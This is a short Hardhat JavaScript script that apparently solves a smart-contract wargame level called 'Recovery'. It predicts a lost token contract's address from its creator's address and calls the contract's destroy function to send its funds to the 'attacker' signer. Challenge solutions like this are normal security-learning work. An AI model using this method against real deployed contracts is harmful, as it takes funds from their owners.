const {
    RECOVERY_INSTANCE_ADDRESS,
    logStartingLevel,
    logSuccessfullyLevel,
    logInstanceAddressIsNull,
    logInstanceAddress,
    logTransactionLink
} = require('./utils');

async function main(levelName) {
    logStartingLevel(levelName);

    if (!RECOVERY_INSTANCE_ADDRESS) {
        logInstanceAddressIsNull(levelName);
        return;
    }
    logInstanceAddress(levelName, RECOVERY_INSTANCE_ADDRESS);

    const [attacker] = await ethers.getSigners();
    // const factory = await ethers.getContractFactory("SimpleToken");
    // const contract = factory.attach(RECOVERY_INSTANCE_ADDRESS);
    //calculate the token contract adddress 
    const tokenAddr = predictContractAddress(RECOVERY_INSTANCE_ADDRESS, 0);
    console.log(`Recovered token address is ${tokenAddr}`);
    //get the contract at that address 
    const tokenContract = await ethers.getContractAt("SimpleToken", tokenAddr);

    //destroy it
    console.log(`destroying token to ${attacker.address}...`);
    const tx = await tokenContract.destroy(attacker.address);
    logTransactionLink(tx.hash);
    await tx.wait(1);

    logSuccessfullyLevel(levelName);
}

function predictContractAddress(creatorAddr, txCount) {
    return "0x" + (ethers.utils.solidityKeccak256(
        ["bytes1", "bytes1", "address", "bytes1"],
        ["0xd6", "0x94", creatorAddr, txCount + 1]
    )).substring(26);
}

module.exports = main;
